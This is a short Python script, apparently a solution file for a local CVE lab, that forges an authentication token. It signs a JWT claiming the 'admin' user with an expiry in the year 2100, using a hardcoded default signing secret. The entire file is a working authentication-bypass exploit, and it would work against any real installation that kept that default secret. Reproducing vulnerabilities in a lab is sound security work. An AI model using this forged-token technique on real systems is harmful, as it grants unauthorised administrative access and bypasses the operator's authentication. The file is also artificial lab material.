#!/usr/bin/env python3
"""Generate the forged JWT used only by this local CVE lab."""

import sys
from pathlib import Path

# The required filename "token.py" can shadow Python's stdlib "token" module.
# Remove only this script directory before importing third-party packages.
SCRIPT_DIR = Path(__file__).resolve().parent
sys.path = [
    entry
    for entry in sys.path
    if Path(entry or ".").resolve() != SCRIPT_DIR
]

import jwt


DEFAULT_SECRET = "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg"
PAYLOAD = {
    "user_name": "admin",
    "user_id": "-30:admin",
    "exp": 4102444800,  # 2100-01-01 00:00:00 UTC
}


print(jwt.encode(PAYLOAD, DEFAULT_SECRET, algorithm="HS256"))
